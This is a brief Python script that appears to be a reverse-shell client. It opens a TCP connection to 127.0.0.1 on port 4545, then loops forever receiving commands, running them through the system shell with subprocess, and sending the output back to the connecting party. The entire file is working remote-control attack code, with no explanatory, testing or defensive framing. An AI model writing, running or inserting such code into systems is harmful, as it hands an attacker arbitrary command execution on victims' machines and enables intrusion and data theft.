import socket
import subprocess

connections = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connections.connect(("127.0.0.1", 4545))

while True:
  
  command = connections.recv(1024)
  result_execute = subprocess.check_output(command, shell=True)
  connections.send(result_execute)